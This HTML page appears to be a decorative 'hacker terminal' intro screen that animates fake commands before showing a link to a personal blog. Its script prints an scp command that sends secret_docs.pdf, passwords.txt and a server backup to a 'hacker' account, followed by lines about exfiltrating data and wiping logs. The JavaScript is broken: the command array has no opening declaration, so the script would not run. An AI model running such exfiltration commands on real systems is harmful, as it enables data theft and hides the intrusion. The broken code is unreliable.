<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacker Terminal trustinveritas</title>
    <style>
        body {
            background-color: #1C202B;
            color: #33ff33;
            font-family: "Courier New", monospace;
            text-align: center;
            padding-top: 100px;
        }
        .terminal {
            display: inline-block;
            border: 2px solid #33ff33;
            padding: 20px;
            width: 1100px;
            height: 800px;
            background: rgba(28, 32, 43, 0.9);
            box-shadow: 0 0 10px #33ff33;
            text-align: left;
            overflow-y: scroll;
            white-space: pre-wrap;
        }
        .cursor {
            display: inline-block;
            width: 10px;
            height: 20px;
            background: #33ff33;
            animation: blink 0.6s infinite alternate;
        }
        @keyframes blink {
            0% { opacity: 1; }
            100% { opacity: 0; }
        }
        .blog-link {
            display: none;
            margin-top: 10px;
        }
        .blog-link a {
            color: #33ff33;
            text-decoration: none;
            font-weight: bold;
        }
        .blog-link a:hover {
            text-shadow: 0 0 5px #33ff33;
        }
    </style>
</head>
<body>
    <div class="terminal" id="terminal">
        <p id="typing"></p><span class="cursor"></span>
        <div class="blog-link" id="blog-link">
            <a href="https://blog.salucci.ch" target="_blank" rel="noopener noreferrer">[ Enter Blog ]</a>
        </div>
    </div>

    <script>

            "",
            "$ scp secret_docs.pdf passwords.txt full_server_backup.tar.gz hacker@192.168.1.100:/home/hacker/downloads/",
            "hacker@192.168.1.100's password: ********",

            "passwords.txt                           100% 500KB  1.2MB/s   00:00",

            "[*] Uploading exfiltrated data to offshore storage...",
            "[*] Logs cleaned, forensic traces removed...",

        ];

        let line = 0;
        function typeCommand() {
            if (line < commands.length) {
                document.getElementById("typing").innerHTML += commands[line] + "\n";
                document.getElementById("terminal").scrollTop = document.getElementById("terminal").scrollHeight;
                line++;
                setTimeout(typeCommand, 1000);
            } else {
                document.getElementById("blog-link").style.display = "block";
            }
        }
        window.onload = typeCommand;
    </script>
</body>
</html>
